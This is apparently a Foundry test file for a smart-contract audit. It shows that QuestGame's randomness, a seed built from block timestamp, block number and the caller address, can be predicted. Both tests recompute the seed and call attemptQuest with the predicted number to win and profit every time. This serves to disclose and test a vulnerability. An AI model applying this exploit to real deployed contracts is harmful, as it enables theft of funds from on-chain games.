
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;
    address public attacker;

    function setUp() public {
        questGame = new QuestGame{value: 1 ether}();
        attacker = address(0x1234);
        vm.deal(attacker, 1 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockTimestamp > 0);
        vm.assume(blockTimestamp < type(uint128).max);
        vm.assume(blockNumber > 0);
        vm.assume(blockNumber < type(uint128).max);

        // --- 2. State Configuration ---
        
        // Manipulate block environment
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // Predict the outcome by replicating the vulnerable logic
        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        // Execute the attack as the attacker
        vm.prank(attacker);
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // Assert predictability - the attacker should have won
        (uint256 experience, uint256 wins) = questGame.getPlayerStats(attacker);
        assertEq(wins, 1, "Attacker should have won by predicting the random number");
        assertEq(experience, 100, "Attacker should have gained 100 experience");
    }

    function test_attackerCanAlwaysWin() public {
        // Set specific block values
        vm.warp(1000000);
        vm.roll(100);

        // Calculate the "random" number before calling
        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        uint256 attackerBalanceBefore = attacker.balance;

        // Execute with the predicted number
        vm.prank(attacker);
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        // Verify the attacker won and received the reward
        uint256 attackerBalanceAfter = attacker.balance;
        assertEq(attackerBalanceAfter, attackerBalanceBefore - 0.1 ether + 0.2 ether, "Attacker should have profited");

        (uint256 experience, uint256 wins) = questGame.getPlayerStats(attacker);
        assertEq(wins, 1, "Attacker should have 1 win");
        assertEq(experience, 100, "Attacker should have 100 experience");
    }
}
